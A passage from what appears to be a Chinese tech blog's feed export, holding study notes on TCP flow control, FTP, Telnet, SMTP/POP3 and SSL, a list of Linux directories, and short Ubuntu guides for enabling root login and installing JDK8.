<h3><span id="快的发送方和慢的接收方">快的发送方和慢的接收方</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501153726.jpg" alt=""></p>
<ul>
<li>发送方发送4个背靠背（b a c k - t o - b a c k）的数据报文段去填充接收方的窗口，然后停下来等待一个A C K。接收方发送A C K（报文段8），但通告其窗口大小为 0，这说明接收方已收到所有数据，但这些数据都在接收方的 T C P缓冲区，因为应用程序还没有机会读取这些数据。</li>
<li>另一个A C K（称为窗口更新）在17.4 ms后发送，表明接收方现在可以接收另外的 4 0 9 6个字节的数据。虽然这看起来像一个 A C K，但由于它并不确认任何新数据，只是用来增加窗口的右边沿，因此被称为窗口更新。</li>
<li>发送方发送最后4个报文段（1 0 ~ 1 3），再次填充了接收方的窗口。注意到报文段 1 3中包括两个比特标志：P U S H和F I N。随后从接收方传来另外两个 A C K，它们确认了最后的4 0 9 6字节的数据（从4 0 9 7到8 1 9 2字节）和F I N（标号为8 1 9 2）。</li>
</ul>
<h2><span id="滑动窗口">滑动窗口</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501153825.jpg" alt=""></p>
<ul>
<li>在这个图中，我们将字节从 1至11进行标号。接收方通告的窗口称为提出的窗口（ o ff e r e dw i n d o w），它覆盖了从第4字节到第9字节的区域，表明接收方已经确认了包括第 3字节在内的数据，且通告窗口大小为 6。回顾第1 7章，我们知道窗口大小是与确认序号相对应的。发送方计算它的可用窗口，该窗口表明多少数据可以立即被发送。</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501154500.jpg" alt=""></p>
<ul>
<li>当接收方确认数据后，这个滑动窗口不时地向右移动。窗口两个边沿的相对运动增加或减少了窗口的大小。使用三个术语来描述窗口左右边沿的运动：<br>1) 称窗口左边沿向右边沿靠近为窗口合拢。这种现象发生在数据被发送和确认时。<br>2) 当窗口右边沿向右移动时将允许发送更多的数据，我们称之为窗口张开。这种现象发生在另一端的接收进程读取已经确认的数据并释放了 T C P的接收缓存时。<br>3) 当右边沿向左移动时，我们称之为窗口收缩。 Host Requirements RFC强烈建议不要使用这种方式。但T C P必须能够在某一端产生这种情况时进行处理</li>
</ul>
<h3><span id="一个例子">一个例子</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501155029.jpg" alt=""></p>
<p>以该图为例可以总结如下几点：<br>1) 发送方不必发送一个全窗口大小的数据。<br>2) 来自接收方的一个报文段确认数据并把窗口向右边滑动。这是因为窗口的大小是相对于确认序号的。<br>3) 正如从报文段7到报文段8中变化的那样，窗口的大小可以减小，但是窗口的右边沿却不能够向左移动。<br>4) 接收方在发送一个A C K前不必等待窗口被填满。在前面我们看到许多实现每收到两个报文段就会发送一个A C K。</p>
<h2><span id="push标志">PUSH标志</span></h2><p>发送方使用该标志通知接收方将所收到的数据全部提交给接收进程。这里的数据包括与 P U S H一起传送的数据以及接收方T C P已经为接收进程收到的其他数据。</p>
<h2><span id="慢启动">慢启动</span></h2><ul>
<li>发送方一开始便向网络发送多个报文段，直至到达接收方通告的窗口大小为止。当发送方和接收方处于同一个局域网时，这种方式是可以的。但是如果在发送方和接收方之间存在多个路由器和速率较慢的链路时，就有可能出现一些问题。一些中间路由器必须缓存分组，并又可能耗尽存储器的空间，然后发生丢包</li>
<li>TCP采用“慢启动（slow start）”算法来降低一开始就发送过多的数据到网络</li>
<li>慢启动为发送方的T C P增加了另一个窗口：拥塞窗口(congestion window)，记为c w n d。当与另一个网络的主机建立 T C P连接时，拥塞窗口被初始化为 1个报文段（即另一端通告的报文段大小）。每收到一个A C K，拥塞窗口就增加一个报文段（ c w n d以字节为单位，但是慢启动以报文段大小为单位进行增加）。发送方取拥塞窗口与通告窗口中的最小值作为发送上限。拥塞窗口是发送方使用的流量控制，而通告窗口则是接收方使用的流量控制。</li>
<li>发送方开始时发送一个报文段，然后等待 A C K。当收到该A C K时，拥塞窗口从1增加为2，即可以发送两个报文段。当收到这两个报文段的 A C K时，拥塞窗口就增加为4。这是一种指数增加的关系。</li>
<li>在某些点上可能达到了互联网的容量，于是中间路由器开始丢弃分组。这就通知发送方它的拥塞窗口开得过大。当我们在下一章讨论 T C P的超时和重传机制时，将会看到它们是怎样对拥塞窗口起作用的。现在，我们来观察一个实际中的慢启动。</li>
</ul>
<h2><span id="发送一个分组的时间">发送一个分组的时间</span></h2><ul>
<li>通常发送一个分组的时间取决于两个因素：传播时延和发送时延</li>
<li>对于一个给定的两个接点之间的同路，传播时延一般是固定的，而发送时延则取决于分组大小</li>
<li>在速率较慢的情况下发送时延起主要作用，而在千兆比特速率下传播时延则占主要地位</li>
</ul>
<h2><span id="带宽时延乘积">带宽时延乘积</span></h2><ul>
<li>为了最大限度的利用链路带宽，必须确保发送发源源不断的收到接收方发送的ACK，做为收到数据的确认和更新window size的大小</li>
<li>在开始阶段，通告的window size必须大于等于带宽和往返时延的乘积，才能确保在收到第一个ACK前，能够一直发送数据流量。因为发送第一个数据报文到收到对应的ACK，时间至少RTT时间</li>
<li>计算通道的容量为：<br>c a p a c i t y (bit) = b a n d w i d t h (b/s) × ro u n d-trip time ( s )</li>
</ul>
<h1><span id="tcp的超时重传">TCP的超时重传</span></h1><p>T C P提供可靠的运输层。它使用的方法之一就是确认从另一端收到的数据。但数据和确认都有可能会丢失。 T C P通过在发送时设置一个定时器来解决这种问题。如果当定时器溢出时还没有收到确认，它就重传该数据</p>
<p>对每个连接，T C P管理4个不同的定时器。<br>1) 重传定时器使用于当希望收到另一端的确认。在本章我们将详细讨论这个定时器以及<br>一些相关的问题，如拥塞避免。<br>2) 坚持( p e r s i s t )定时器使窗口大小信息保持不断流动，即使另一端关闭了其接收窗口<br>3) 保活( k e e p a l i v e )定时器可检测到一个空闲连接的另一端何时崩溃或重启<br>4) 2MSL定时器测量一个连接处于 T I M E _ WA I T状态的时间。</p>
<h1><span id="ftp文件传送协议">FTP：文件传送协议</span></h1><h2><span id="ftp简介">FTP简介</span></h2><ul>
<li>数据传输主流协议</li>
<li>两个信道<ul>
<li>第一信道，控制信道，无论何时都是由客户端发起连接。采用客户端服务器模式。服务端监听21端口。用于控制命令的传输。主要任务就是认证，控制命令（如查看文件列表等）等</li>
<li>第二信道，数据信道。根据数据信道是否由服务端发起，区分ActiveMode和PassiveMode。数据的传输走的是第二信道，包括文件列表数据的传输。</li>
<li>TCP的知名端口号（服务端的监听端口），21号，是控制信道的端口。</li>
</ul>
</li>
<li>FTP两个模式<ul>
<li>Active Mode</li>
<li>Passive Mode</li>
</ul>
</li>
</ul>
<h2><span id="ftp命令">FTP命令</span></h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010583_4654.png" alt=""></p>
<h2><span id="active-mode">Active Mode</span></h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010584_5069.png" alt=""></p>
<ul>
<li>第一信道通常三次握手建立FTP连接</li>
<li>第二信道（数据信道），是由服务器主动发起的，即是ActiveMode。</li>
<li>第二信道（数据通道），是服务器被动接收的，即是PassiveMode。</li>
<li>可见，第二信道，即数据信道（传输数据而非控制命令），是由服务端主动发起的，即是主动模式（ActiveMode）；如果不是服务器主动发起的，即是被动模式（PassiveMode）。</li>
<li>第一信道中，客户端向FTP服务器发送的数据中，含有PORT（a,b,c,d,e,f）这里a,b,c,d,e,f每上表示0~255的数据，其中a,b,c,d表示客户端的IP，e,f表示客户端的第二通道的端口（计算方法是：e*256+f）。这主要是为了供第二通道中，服务端主动发起向客户端的连接使用的。</li>
</ul>
<h2><span id="安全性">安全性</span></h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010584_9056.png" alt=""><br>注意：由于用户名和密码都是明文传输，易于被截获，因此，对于FTP来说，使用匿名登陆反而更安全。</p>
<h2><span id="list">List</span></h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010585_6448.png" alt=""><br>客户端第二通道是IP和端口是： 202.100.1.100,4<em>256+38<br>第一次传入PORT后，紧跟的是一个控制命令，LIST（查看列表）。<br>然后，服务端20号端口通过第二信道与客户端的4</em>256+38端口建立连接，并传送文件列表。</p>
<h2><span id="download">Download</span></h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010601_6947.png" alt=""><br>当单击文件列表中的一个文件，又出现了一个PORT发给服务端（注意这次的端口号有变化，4<em>256+42），接着又发了一个RETR命令，后面跟着所请求的文件。<br>这时，服务端20号端口又通过第二信道与客户端4</em>256+42端口建立连接，并传送该文件。（注意，与第一次不是同一个端口号，也就是说又建立了一次连接）<br>注意：这里是又建立了一次连接。</p>
<h2><span id="passive-mode">Passive Mode</span></h2><p><img src="http://img.my.csdn.net/uploads/201512/13/1450010602_9427.png" alt=""><br>第二信道，服务器被动接受为被动模式（PassiveMode）。<br>在第一信道中，客户端发送PASV命令，询问服务端是否支持被动模式。服务端回复227表示支持，这时a,b,c,d,e,f表示服务端第二信道的IP和端口。<br>目前一般使用的是PassiveMode模式，客户端连接后，一般会发PASV询问服务器是否支持PassiveMode，如果支持，则使用PassiveMode。</p>
<h1><span id="telnet远程登录">Telnet：远程登录</span></h1><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501205934.jpg" alt=""></p>
<ul>
<li>1) Te l n e t客户进程同时和终端用户和T C P / I P协议模块进行交互。通常我们所键入的任何信息的传输是通过T C P连接，连接的任何返回信息都输出到终端上。</li>
<li>Te l n e t服务器进程经常要和一种叫做“伪终端设备”（pseudo-terminal device）打交道，至少在U n i x系统下是这样的。这就使得对于登录外壳 ( s h e l l )进程来讲，它是被Te l n e t服务器进程直接调用的，而且任何运行在登录外壳进程处的程序都感觉是直接和一个终端进行交互。</li>
<li>仅仅使用了一条T C P连接。由于客户进程必须多次和服务器进程进行通信（反之亦然），这就必然需要某些方法，来描绘在连接上传输的命令和用户数据。</li>
</ul>
<h2><span id="telnet协议">Telnet协议</span></h2><p>Te l n e t协议可以工作在任何主机（例如，任何操作系统）或任何终端之间。    </p>
<h2><span id="nvt-ascii">NVT ASCII</span></h2><ul>
<li>术语NVT ASCII代表7比特的A S C I I字符集，网间网协议族都使用NVT ASCII。每个7比特的字符都以8比特格式发送，最高位比特为0。</li>
<li>行结束符以两个字符 C R（回车）和紧接着的 L F（换行）这样的序列表示。以 \ r \ n来表示。单独的一个 C R也是以两个字符序列来表示，它们是 C R和紧接着的 N U L（字节0），以\ r \ 0表示。</li>
<li>F T P, SMTP, Finger和W h o i s协议都以NVT ASCII来描述客户命<br>令和服务器的响应。</li>
</ul>
<h2><span id="telnet命令">Telnet命令</span></h2><p>Te l n e t通信的两个方向都采用带内信令方式。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170501210711.jpg" alt=""></p>
<h2><span id="一次一个字符方式">一次一个字符方式</span></h2><p>我们所键入的每个字符都单独发送到服务器进程。服务器进程回显大多数的字符，除非服务器进程端的应用程序去掉了回显功能。该方式的缺点也是显而易见的。当网络速度很慢，而且网络流量比较大的时候，那么回显的速度也会很慢。虽然如此，但目前大多数 Te l n e t实现都把这种方式作为默认方式。</p>
<h2><span id="telnet协议两大特点">Telnet协议两大特点</span></h2><ul>
<li>交互式TCP数据流的特点</li>
<li>安全问题（替代协议SSH）</li>
</ul>
<h1><span id="smtppop3简单邮件传送协议邮局协议版本3">SMTP/POP3：简单邮件传送协议/邮局协议版本3</span></h1><h2><span id="smtp简介">SMTP简介</span></h2><ul>
<li>SMTP（Simple Mail Transfer Protocol）即简单邮件传输协议,它是一组用于由源地址到目的地址传送邮件的规则，由它来控制信件的中转方式。SMTP协议属于TCP/IP协议簇，它帮助每台计算机在发送或中转信件时找到下一个目的地。通过SMTP协议所指定的服务器,就可以把E-mail寄到收信人的服务器上了，整个过程只要几分钟。SMTP服务器则是遵循SMTP协议的发送邮件服务器，用来发送或中转发出的电子邮件。</li>
<li>SMTP 是一种TCP协议支持的提供可靠且有效电子邮件传输的应用层协议。SMTP 是建立在 TCP上的一种邮件服务，主要用于传输系统之间的邮件信息并提供来信有关的通知。[1] </li>
<li>端口 25</li>
</ul>
<h2><span id="smtp协议的邮件路由过程">SMTP协议的邮件路由过程</span></h2><p>STMP服务器基于域名服务器DNS中计划收件人的域名来路由电子邮件。SMTP服务器基于DNS的MX记录来路由电子邮件，都应向该主机发送。若SMTP服务器mail.abc.com收到一封信要发到shuer@sh.abc.com，则执行以下过程：</p>
<ul>
<li>Sendmail请求DNS给出主机sh.abc.com的CNAME记录，如有，假若CNAME（别名记录）到shmail.abc.com，则再次请求shmail.abc.com的CNAME的记录，直到没有为止</li>
<li>假定被CNAME到shmail.abc.com，然后sendmail请求@abc.com域的DNS给出shmail.abc.com的MX记录（邮件路由及记录），shmail MX 5 shmail.abc.com 10 shmail2.abc.com</li>
<li>Sendmail组合请求DNS给出shmail.abc.com的A记录（主机名或域名对应的IP地址记录），即IP地址，若返回值为1.2.3.4（假设值）</li>
<li>Sendmail与1.2.3.4连接，传送这封给shuser@sh.abc.com的信到1.2.3.4这台服务器的SMTP后台程序</li>
</ul>
<h2><span id="smtp协议工作原理">SMTP协议工作原理</span></h2><p>SMTP是工作在两种情况下：一是电子邮件从客户机传输到服务器；二是从某一个服务器传输到另一个服务器。SMTP也是个请求/响应协议，命令和响应都是基于ASCII文本，并以CR和LF符结束。响应包括一个表示返回状态的三位数字代码。SMTP在TCP协议25号端口监听连续请求。<br>连接和发送过程如下：</p>
<ul>
<li>建立TCP连接</li>
<li>客户端发送HELO命令以标识发件人自己的身份，然后客户端发送MAIL命令；服务器正希望以OK作为响应，表明准备接收</li>
<li>客户端发送RCPT命令，以标识该电子邮件的计划接收人，可以有多个RCPT行；服务器端则表示是否愿意为收件人接收邮件</li>
<li>协商结束，发送邮件，用命令DATA发送</li>
<li>以“.”号表示结束输入内容一起发送出去，结束此次发送，用QUIT命令退出</li>
</ul>
<h2><span id="smtp-inspection介绍">SMTP Inspection介绍</span></h2><ul>
<li><p>Allow only seven minimum SMTP<br>commands:helo,mail,rcpt,data,rset,noop,and,quit(RFC 821)</p>
</li>
<li><p>Adds support for eight ESMTP<br>commands:auth,data,ehlo,etrn,saml,send,soml,and vrfy</p>
</li>
<li><p>默认在TCP/25上激活了ESMTP监控</p>
</li>
<li>如果禁用此功能，所有SMTP命令都能穿越防火墙，邮件服务器潜在的漏洞就暴露在攻击者面前</li>
</ul>
<h2><span id="pop简介">POP简介</span></h2><ul>
<li>POP3，全名为“Post Office Protocal-Version3”，即“邮局协议版本3”。是TCP/IP协议族中的一员，由RFC1939定义。本协议主要用于支持使用客户端远程管理在服务器上的电子邮件。提供SSL加密的POP3协议被称为POP3S.</li>
<li>POP协议支持“离线”邮件处理。其具体过程是：邮件发送到服务器上，电子邮件客户端调用邮件客户机程序以连接服务器，并下载所有未阅读的电子邮件，这种离线访问模式是一种存储转发服务，将邮件从邮件服务器端发送到个人终端机器上，一般是PC机或MAC。一旦邮件发送到PC机或MAC上，邮件服务器上的邮件将会被删除。但目前的POP3邮件服务器大都可以“只下载邮件，服务器端并不删除”,也就是改进的POP3协议</li>
<li>传输协议：TCP/110</li>
</ul>
<h2><span id="pop命令">POP命令</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">USER			//键入用户名</span><br><span class="line">PASS			//键入密码</span><br><span class="line">STAT			//查看服务器状态</span><br><span class="line">List			//罗列邮件</span><br><span class="line">RETR 1			//收ID为1的邮件</span><br></pre></td></tr></table></figure>
<h1><span id="ssl安全套接层">SSL：安全套接层</span></h1><h2><span id="ssl简介">SSL简介</span></h2><ul>
<li>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。</li>
<li>SSL是一个不依赖于平台和运用程序的协议，用于保障TCP-based运用安全，SSL在TCP层和运用层之间，就想运用层连接到TCP来连接的一个插口</li>
</ul>
<h2><span id="ssl加密知名协议">SSL加密知名协议</span></h2><ul>
<li><p>HTTP over SSL：加密网页流量是设计SSL的初衷,HTTP也是第一个使用SSL保障安全的运用层协议<br>当Netscape在它的Navigator里面运用HTTP over SSL的时候，它使用<a href="https://来标识HTTP" target="_blank" rel="noopener">https://来标识HTTP</a> over SSL，因此HTTP over SSL就以HTTPS的格式被熟知。后来HTTPS在RFC2818被标准化。HTTPS工作在TCP 443号端口，但是普通的HTTP默认工作在TCP 80端口</p>
</li>
<li><p>Email over SSL：类似于HTTP over SSL，邮件协议例如：SMTP,POP3和IMAP也能支持SSL</p>
</li>
</ul>
<h2><span id="ssl的位置">SSL的位置</span></h2><p>SSL介于应用层和TCP层之间。应用层数据不再直接传递给传输层，而是传递给SSL层，SSL层对从应用层收到的数据进行加密，并增加自己的SSL头。<br><img src="http://pic002.cnblogs.com/images/2012/38542/2012100609461432.png" alt=""></p>
<h2><span id="工作流程">工作流程</span></h2><ul>
<li><p>服务器认证阶段：1）客户端向服务器发送一个开始信息“Hello”以便开始一个新的会话连接；2）服务器根据客户的信息确定是否需要生成新的主密钥，如需要则服务器在响应客户的“Hello”信息时将包含生成主密钥所需的信息；3）客户根据收到的服务器响应信息，产生一个主密钥，并用服务器的公开密钥加密后传给服务器；4）服务器回复该主密钥，并返回给客户一个用主密钥认证的信息，以此让客户认证服务器。</p>
</li>
<li><p>用户认证阶段：在此之前，服务器已经通过了客户认证，这一阶段主要完成对客户的认证。经认证的服务器发送一个提问给客户，客户则返回（数字）签名后的提问和其公开密钥，从而向服务器提供认证。</p>
</li>
</ul>
<p>SSL协议提供的安全通道有以下三个特性：</p>
<ul>
<li>机密性：SSL协议使用密钥加密通信数据。</li>
<li>可靠性：服务器和客户都会被认证，客户的认证是可选的。</li>
<li>完整性：SSL协议会对传送的数据进行完整性检查。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[[第四周]LinuxLinux各个目录的作用及内容]]></title>
      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-LinuxLinux%E5%90%84%E4%B8%AA%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8F%8A%E5%86%85%E5%AE%B9.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="主要目录">主要目录</span></h2><h3><span id="">/</span></h3><p>/处于Linux文件系统树形结构的最顶端，它是Linux文件系统的入口，所有的目录、文件、设备都在/之下。</p>
<h3><span id="bin">/bin</span></h3><p>该目录存放着系统最常用的最重要的命令，相当于DOS下的内部命令，只不过它们是以独立的文件形式存在。比如：ls、cp、mkdir等命令。这个目录中的文件都是可执行的并且是普通用户都可以使用的命令。作为系统最基础的命令都放在这里。</p>
<h3><span id="usr">/usr</span></h3><p>该目录是系统存放程序的地方，比如普通命令、帮助文件、安装的软件等。这个目录下有很多的文件和目录。当我们安装一个Linux发行版官方提供的软件包时，大多安装在这里。当有涉及服务器的配置文件时，会把配置文件安装在/etc目录中。/usr目录下包括涉及字体目录/usr/share/fonts、帮助目录/usr/share/man或/usr/share/doc等。</p>
<h3><span id="var">/var</span></h3><p>该目录的内容是经常变动的，/var下有/var/log目录用来存放系统日志的目录。/var/www目录用来定义Apache服务器站点存放目录。/var/lib用来存放一些库文件。</p>
<h3><span id="sbin">/sbin</span></h3><p>大多数涉及系统管理的命令都存放在该目录中，它是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令，凡是目录sbin中包含的命令都是root权限才能执行的。</p>
<h3><span id="root">/root</span></h3><p>Linux超级权限用户(系统管理员)root的主目录。</p>
<h3><span id="home">/home</span></h3><p>普通用户的主目录都默认存放在该目录中，比如：有个用户叫wang，那它的主目录就是/home/wang，也可以用~wang表示。</p>
<h3><span id="etc">/etc</span></h3><p>该目录是系统配置文件的所在地，一些服务器的配置文件也在这里，比如：用户帐号及密码配置文件等。</p>
<h3><span id="boot">/boot</span></h3><p>Linux的内核及引导系统的程序所需要的文件都存放在该目录中，比如vmlinuz、initrd.img等文件都位于这个目录中。在一般情况下，GRUB或LILO系统引导管理器在这个目录中。</p>
<h3><span id="opt">/opt</span></h3><p>该目录是可选的软件包安装目录，有些软件包我们可以将它安装在该目录中。</p>
<h3><span id="tmp">/tmp</span></h3><p>该目录用于存放临时文件，有时用户运行程序的时候，会产生一些临时文件。/tmp就是用来存放临时文件的。/var/tmp目录和该目录的作用是相似的。</p>
<h3><span id="lostfound">/lost+found</span></h3><p>在ext2或ext3文件系统中，当系统意外崩溃或机器意外关机，而产生的一些文件碎片就存放在该目录中。当系统启动在过程中fsck工具会检查这里，并修复已经损坏的文件系统。 有时系统发生问题，有很多的文件被移到这个目录中，可能要用手工的方式来修复，或移到文件原来的位置上。</p>
<h3><span id="lib">/lib</span></h3><p>该目录用于存放库文件，这个目录里存放着系统最基本的共享库，其作用类似于Windows里的.dll文件。几乎所有的应用程序都须要用到这些共享库。</p>
<h3><span id="mnt">/mnt</span></h3><p>该目录是用于存放挂载储存设备的挂载目录的，系统提供这个目录是让用户临时挂载别的文件系统，比如有cdrom等目录。</p>
<h3><span id="proc">/proc</span></h3><p>操作系统运行时，进程（正在运行中的程序）信息及内核信息（比如cpu、硬盘分区、内存信息等）存放在这里。/proc目录是伪装的文件系统proc的挂载目录，proc并不是真正的文件系统。因此，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。也就是说，这个目录的内容不在硬盘上而是在内存里。</p>
<h3><span id="misc">/misc</span></h3><p>该目录可以用来存放杂项文件或目录，即那些用途或含义不明确的文件或目录可以存放在该目录下。</p>
<h3><span id="media">/media</span></h3><p>即插即用型存储设备的挂载点自动在该目录下创建。比如USB盘系统自动挂载后，会在这个目录下产生一个目录；CDROM/DVD自动挂载后，也会在这个目录中创建一个目录，类似于cdrom这个目录。该目录只有在最新的发行套件上才有。</p>
<h2><span id="其余目录">其余目录</span></h2><h3><span id="initrd">/initrd</span></h3><p>系统在启动前的内核是压缩的（这和ramdisk有关），当系统启动时需要解压缩，该目录就是解压缩时的临时目录，当启动完后又将该目录清空。</p>
<h3><span id="usrman">/usr/man</span></h3><p>该目录是Linux系统帮助文档的存放目录。</p>
<h3><span id="proccpuinfo">/proc/cpuinfo</span></h3><p>关于处理器的信息，如类型、厂家、型号和性能等。比如cat /proc/cpuinfo    </p>
<h3><span id="procdevices">/proc/devices</span></h3><p>当前运行内核所配置的所有设备清单。    </p>
<h3><span id="procfilesystems">/proc/filesystems</span></h3><p>当前运行内核所配置的文件系统。    </p>
<h3><span id="procdma">/proc/dma</span></h3><p>当前正在使用的DMA通道。    </p>
<h3><span id="procinterrupts">/proc/interrupts</span></h3><p>正在使用的中断和曾经有多少个中断。    </p>
<h3><span id="procioports">/proc/ioports</span></h3><p>当前正在使用的I/O端口。    </p>
<h3><span id="etcinitd">/etc/init.d</span></h3><p>这个目录是用来存放系统或服务器以System V模式启动的脚本，这在以System V模式启动或初始化的系统中常见。比如RedHat Fedora。    </p>
<h3><span id="etcxinetdd">/etc/xinetd.d</span></h3><p>如果服务器是通过xinetd模式运行的，它的脚本要放在这个目录下。有些系统没有这个目录，比如Slackware，有些老的版本也没有。在Redhat Fedora中比较新的版本中存在。    </p>
<h3><span id="etcrcd">/etc/rc.d</span></h3><p>这是Slackware发行版中有的一个目录，是BSD方式启动脚本的存放地，比如定义网卡，服务器开启脚本等。    </p>
<h3><span id="etcx11">/etc/X11</span></h3><p>是X-Window相关的配置文件存放地。    </p>
<h3><span id="usrbin">/usr/bin</span></h3><p>这个目录是可执行程序的目录，普通用户就有权限执行。当我们从系统自带的软件包安装一个程序时，他的可执行文件大多会放在这个目录。相似的目录是/usr/local/bin目录。有时/usr/bin中的文件是/usr/local/bin的链接文件。    </p>
<h3><span id="usrsbin">/usr/sbin</span></h3><p>这个目录也是可执行程序的目录，但大多存放涉及系统管理的命令。只有root权限才能执行，相似目录是/sbin或/usr/local/sbin或/usr/X11R6/sbin等。    </p>
<h3><span id="usrlocal">/usr/local</span></h3><p>这个目录一般是用来存放用户自编译安装软件的存放目录。一般是通过源码包安装的软件，如果没有特别指定安装目录的话，一般是安装在这个目录中。    </p>
<h3><span id="usrlib">/usr/lib</span></h3><p>该目录和/lib目录相似，是库文件的存储目录。存放一些常用的共享库。    </p>
<h3><span id="usrshare">/usr/share</span></h3><p>该目录用于存放系统共用的东西，比如/usr/share/fonts是字体目录，是用户都共用的。    </p>
<h3><span id="usrsharedoc">/usr/share/doc</span></h3><p>该目录是Linux共享文档的存放地。    </p>
<h3><span id="usrshareman">/usr/share/man</span></h3><p>该目录是共享的帮助文件的存放地。    </p>
<h3><span id="usrsrc">/usr/src</span></h3><p>该目录是内核源码存放地，下面有内核源码目录，比如linux、linux-2.xxx.xx目录等。有的系统也会把一些源码软件包安装在这里，比如Redhat Fedora。另外Redhat 4.0/5.0，它的内核源码包的目录位于/usr/src/kernels目录下的某个目录中（只有安装后才会生成相应目录）。    </p>
<h3><span id="varadm">/var/adm</span></h3><p>比如软件包安装信息、日志、管理信息等就存放在该目录下，在Slackware操作系统中是有这个目录的。在Fedora中好象没有。    　</p>
<h3><span id="varlog">/var/log</span></h3><p>该目录用于存放系统日志。    </p>
<h3><span id="varspool">/var/spool</span></h3><p>打印机、邮件、代理服务器等假脱机目录存放在该目录下。</p>
<h2><span id="附图">附图</span></h2><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2011110620371927.png" alt=""></p>
<p>转载自 <a href="http://www.cnblogs.com/shishm/" target="_blank" rel="noopener">时邵猛</a></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 16.10下root用户直接登录]]></title>
      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-Ubuntu-16-10%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h3><span id="设置root密码">设置root密码</span></h3><p>使用如下命令设置root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure></p>
<h3><span id="测试">测试</span></h3><p>使用如下命令测试是否可以进入root用户，如果@前的用户名变为root则说明设置成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure></p>
<h3><span id="修改文件">修改文件</span></h3><p>进入到进入到/usr/share/lightdm/lightdm.conf.d/目录,使用如下命令打开此文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit 50-unity-greeter.conf</span><br></pre></td></tr></table></figure></p>
<p>在此文件中添加如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user-session=ubuntu</span><br><span class="line">greeter-show-manual-login=true</span><br><span class="line">all-guest=false</span><br></pre></td></tr></table></figure></p>
<h3><span id="重启系统">重启系统</span></h3><p>点击登录，然后输入root用户，再输入前面设置的密码</p>
<h3><span id="修复错误">修复错误</span></h3><p>登录系统后会出现：读取/root/.profile时发现错误的对话框<br>点击确定进入系统，使用如下命令修改文件，找到mesg n，修改为：tty -s &amp;&amp; mesg n<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit /root/.profile</span><br></pre></td></tr></table></figure></p>
<p>保存退出，重启系统即可。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Ubuntu 16.10下JDK8的安装配置]]></title>
      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8BJDK8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="jdk8安装">JDK8安装</span></h2><p>安装只需输入命令即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:webupd8team/java  </span><br><span class="line">sudo apt-get update  </span><br><span class="line">sudo apt-get install oracle-java8-installer</span><br></pre></td></tr></table></figure>
<p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure></p>
<p>如果显示版本信息则安装成功</p>
<h2><span id="配置java_home环境变量">配置$JAVA_HOME环境变量</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/environment   //前提安装vim</span><br></pre></td></tr></table></figure>
